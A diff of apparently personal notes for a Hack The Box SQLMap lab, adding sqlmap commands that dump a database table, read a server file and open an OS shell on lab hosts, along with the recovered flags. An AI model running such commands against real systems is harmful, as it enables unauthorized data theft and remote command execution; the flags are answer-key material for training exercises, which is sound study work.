@@ -44,13 +44,19 @@ proxychains4 -q -f <(echo "strict_chain\nremote_dns_-subnet 224\ntcp_read_time_o
 
 # What's the contents of table flag11? (Case #11)
 
+sqlmap -u "94.237.54.41:34291/case11.php/?id=1" -T flag11 --dump --crawl=2 --tamper=space2comment
+
 ```
 
 ```bash
 # Try to use SQLMap to read the file "/var/www/html/flag.txt".
+sqlmap -u "http://94.237.63.201:48886" --file-read "/var/www/html/flag.txt"
+# HTB{5up3r_u53r5_4r3_p0w3rful!}
 
 # Use SQLMap to get an interactive OS shell on the remote host # and try to find another flag within the host.
 # The flag is in a very common directory!
+sqlmap -u "http://94.237.63.201:48886" --os-shell --crawl=2 --technique=E
+# HTB{n3v3r_run_db_45_db4}
 
 ```
 
